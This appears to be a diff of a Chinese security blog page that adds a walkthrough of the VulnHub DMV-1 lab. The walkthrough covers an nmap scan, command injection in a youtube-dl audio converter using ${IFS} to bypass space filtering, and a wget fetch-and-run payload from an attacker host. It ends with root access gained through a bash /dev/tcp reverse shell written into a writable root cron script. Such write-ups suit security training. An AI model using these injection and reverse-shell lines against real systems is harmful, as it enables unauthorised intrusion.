@@ -16,7 +16,7 @@
 
 
 
-<title>Category: 渗透测试 | Blacknight</title>
+<title>vulnhub——DMV | Blacknight</title>
 
 
 
@@ -303,75 +303,210 @@
     }
 </script>
         <div class="main">
-            
-
-
+            <div class="container">
     
-<div class="container">
-    <div class="post-wrap categories">
-        <h2 class="post-title">-&nbsp;Categories&nbsp;·&nbsp;渗透测试-</h2>
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
     </div>
-    <div class="post-wrap archive">
-    
-    
-        
-
-        
-            <h3>2020</h3>
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/09/27/cs_learn_note/">cobalt_strike基本使用</a>
-            <span class="archive-item-date">September 27, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/07/28/msf_note5/">metasploit免杀技巧</a>
-            <span class="archive-item-date">July 28, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/07/27/msf_note4/">meterpreter基本使用</a>
-            <span class="archive-item-date">July 27, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/07/26/msf_note3/">metasploit渗透实例</a>
-            <span class="archive-item-date">July 26, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/07/24/msf_note2/">metasploit配合nessus</a>
-            <span class="archive-item-date">July 24, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/07/22/msf_note1/">metasploit基础扫描</a>
-            <span class="archive-item-date">July 22, 2020</span>
-        </article>
-    
-    
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
 </div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulnhub——DMV</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 23, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/vulnhub/">vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="DMV-1"><a href="#DMV-1" class="headerlink" title="DMV-1"></a>DMV-1</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-09 03:04 EST</span><br><span class="line">Nmap scan report for 192.168.93.135</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)</span><br><span class="line">|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)</span><br><span class="line">|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">MAC Address: 00:0C:29:9E:3B:DC (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.93.135</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds</span><br></pre></td></tr></table></figure>
+
+<p>80页面貌似是个音频转换的服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109161006.png" alt=""></p>
+<p>抓包可以看到报错信息，得知有个叫youtube-dl的服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109161756.png" alt=""></p>
+<p>github上瞅瞅发现是个高达87k的项目</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109162035.png" alt=""></p>
+<h3 id="命令执行获取shell"><a href="#命令执行获取shell" class="headerlink" title="命令执行获取shell"></a>命令执行获取shell</h3><p>抓包测试发现存在命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109164342.png" alt=""></p>
+<p>但是貌似空格出了点问题，${IFS}试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109170246.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109170308.png" alt=""></p>
+<p>尝试反弹shell，bash失败，python失败</p>
+<p>尝试wget下载文件到目标主机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;wget$&#123;IFS&#125;http:&#x2F;&#x2F;192.168.93.129&#x2F;shell.txt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109170440.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;bash$&#123;IFS&#125;shell.txt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109171011.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109171130.png" alt=""></p>
+<h3 id="特权文件提权"><a href="#特权文件提权" class="headerlink" title="特权文件提权"></a>特权文件提权</h3><p>只有一个用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109171322.png" alt=""></p>
+<p>上传pspy64我们可以看到目标主机会自动执行两个文件，都是root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109172503.png" alt=""></p>
+<p>cloud-id是root权限我们动不了，但是clean.sh是www-data可读可写</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109172658.png" alt=""></p>
+<p>那么直接写入bash命令反弹即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.93.129&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109173015.png" alt=""></p>
+<p>等待执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109173118.png" alt=""></p>
+<p>root目录下找到第二个flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109173203.png" alt=""></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/12/23/vulnhub_DMV/">http://www.blacknight.top/2020/12/23/vulnhub_DMV/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12/25/vulnhub_os_bytesec/">vulnhub——os_bytesec</a>
+            
+            
+            <a class="next" rel="next" href="/2020/11/20/vulnhub_djinn/">vulnhub——djinn系列</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
 </div>
 
         </div>
